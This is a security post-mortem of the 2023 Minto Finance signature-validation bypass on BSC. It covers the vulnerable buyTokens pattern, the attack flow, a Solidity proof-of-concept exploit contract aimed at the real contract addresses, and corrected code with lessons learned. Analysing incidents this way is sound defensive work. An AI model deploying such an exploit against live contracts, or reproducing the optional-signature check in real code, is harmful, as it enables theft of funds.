# Minto Finance Signature Validation Bypass Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Minto Finance (BTCMT) |
| Date | 2023-07-10 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$9,000 USD |
| Attack Type | Signature Validation Bypass |
| CWE | CWE-347 (Improper Verification of Cryptographic Signature) |
| Attacker Address | `0xc5001f60db92afcc23177a6c6b440a4226cb58bf` |
| Attack Contract | `0xba91db0b31d60c45e0b03e6d515e45fcabc7b1cd` |
| Vulnerable Contract | `0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5` (ReferalCrowdSales) |
| Fork Block | 30,214,253 |

## 2. Vulnerability Code Analysis

Minto Finance's `ReferalCrowdSales` contract validated referral signatures in the `buyTokens()` function, but the validation could be bypassed by passing an empty signature and a zero address. Even with an invalid signature, the function would execute normally, allowing an attacker to obtain BTCMT tokens.

```solidity
// Vulnerable pattern: signature validation bypassable with empty signature
contract ReferalCrowdSales {
    // Vulnerable: callable with empty bytes signature and zero address referrer
    function buyTokens(
        address referrer,
        bytes calldata signature,
        uint256 deadline
    ) external payable {
        // Vulnerable: no validation of signature length or content
        if (signature.length > 0) {
            address signer = recoverSigner(referrer, deadline, signature);
            require(signer == authorizedSigner, "Invalid signature");
        }
        // If signature is empty, proceeds without referrer bonus
        // But the token purchase itself is permitted
        uint256 tokenAmount = calculateTokens(msg.value);
        BTCMT.transfer(msg.sender, tokenAmount);
    }

    // Vulnerable: insufficient handling of zero address referrer
    function calculateTokens(uint256 ethAmount) internal view returns (uint256) {
        // Calculation based on spot price (manipulable)
        return ethAmount * currentRate / 1e18;
    }
}
```

**Vulnerability**: When `buyTokens()` is called with an empty signature (`bytes("")`) and a zero address (`address(0)`) as the referrer, the signature validation logic is skipped or bypassed, allowing the normal purchase flow to execute. The attacker exploited this by repeatedly calling the function to acquire BTCMT at below-market prices and selling on PancakeSwap V3 for profit.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Signature Validation Bypass
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0xc5001f60db92afcc23177a6c6b440a4226cb58bf]
  │
  ├─1─▶ ReferalCrowdSales.buyTokens() call
  │      [Contract: 0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5]
  │      referrer = address(0)
  │      signature = bytes("") (empty signature)
  │      → Signature validation bypassed, BTCMT tokens acquired
  │
  ├─2─▶ BTCMT.approve(PancakeRouter3, amount)
  │      [BTCMT: 0x410a56541bD912F9B60943fcB344f1E3D6F09567]
  │
  ├─3─▶ PancakeRouter3.exactInputSingle()
  │      BTCMT → BUSD swap
  │      [BUSD: 0x55d398326f99059fF775485246999027B3197955]
  │
  └─4─▶ Profit realized (~$9,000 USD)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IReferalCrowdSales {
    function buyTokens(
        address referrer,
        bytes calldata signature,
        uint256 deadline
    ) external payable;
}

interface IPancakeRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256);
}

contract MintoFinanceExploit {
    IReferalCrowdSales crowdSales = IReferalCrowdSales(0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5);
    IERC20 BTCMT = IERC20(0x410a56541bD912F9B60943fcB344f1E3D6F09567);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouterV3 pancakeV3 = IPancakeRouterV3(/* PancakeRouter V3 */);

    function testExploit() external payable {
        // Call buyTokens with empty signature — bypasses signature validation
        crowdSales.buyTokens{value: msg.value}(
            address(0),   // referrer = zero address
            bytes(""),    // empty signature
            block.timestamp
        );

        uint256 btcmtBalance = BTCMT.balanceOf(address(this));
        BTCMT.approve(address(pancakeV3), btcmtBalance);

        // Realize profit by swapping BTCMT → BUSD
        pancakeV3.exactInputSingle(
            IPancakeRouterV3.ExactInputSingleParams({
                tokenIn: address(BTCMT),
                tokenOut: address(BUSD),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: btcmtBalance,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-347 (Improper Verification of Cryptographic Signature) |
| Vulnerability Type | Signature validation bypass, empty signature accepted |
| Affected Scope | ReferalCrowdSales presale contract |
| Explorer | [BSCscan](https://bscscan.com/address/0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5) |

## 6. Security Recommendations

```solidity
// Fix 1: Enforce signature length and content validation
function buyTokens(
    address referrer,
    bytes calldata signature,
    uint256 deadline
) external payable {
    // Signature must always be present
    require(signature.length == 65, "Invalid signature length");
    require(block.timestamp <= deadline, "Signature expired");

    // Enforce signature validation
    bytes32 messageHash = keccak256(abi.encodePacked(
        msg.sender, referrer, deadline, address(this)
    ));
    bytes32 ethSignedHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
    address signer = ECDSA.recover(ethSignedHash, signature);
    require(signer == authorizedSigner, "Invalid signature");

    uint256 tokenAmount = calculateTokens(msg.value);
    BTCMT.transfer(msg.sender, tokenAmount);
}

// Fix 2: Nonce-based signature replay prevention
mapping(bytes32 => bool) public usedSignatures;

function buyTokens(
    address referrer,
    bytes calldata signature,
    uint256 deadline,
    uint256 nonce
) external payable {
    bytes32 sigHash = keccak256(signature);
    require(!usedSignatures[sigHash], "Signature already used");
    usedSignatures[sigHash] = true;
    // ... remaining validation
}

// Fix 3: Use EIP-712 structured signatures
function buyTokensWithEIP712(
    address referrer,
    uint256 deadline,
    bytes calldata signature
) external payable {
    bytes32 structHash = keccak256(abi.encode(
        BUYTOKENS_TYPEHASH,
        msg.sender,
        referrer,
        deadline
    ));
    bytes32 digest = _hashTypedDataV4(structHash);
    require(ECDSA.recover(digest, signature) == authorizedSigner, "Invalid signature");
    // ...
}
```

## 7. Lessons Learned

1. **Risk of Optional Signature Handling**: Validating a signature conditionally with `signature.length > 0` creates a bypass path where the function can be called without any signature at all. Signatures must always be required.
2. **Empty Input Validation**: Cryptographic signatures, address parameters, and similar inputs must explicitly reject empty or zero values.
3. **Presale Contract Security**: Token sale contracts can be vulnerable to both price manipulation and signature validation bypass, necessitating a dual security layer (price cap + mandatory signature enforcement).
4. **EIP-712 Standard Compliance**: Using structured data signatures (EIP-712) prevents signature replay attacks and parameter tampering.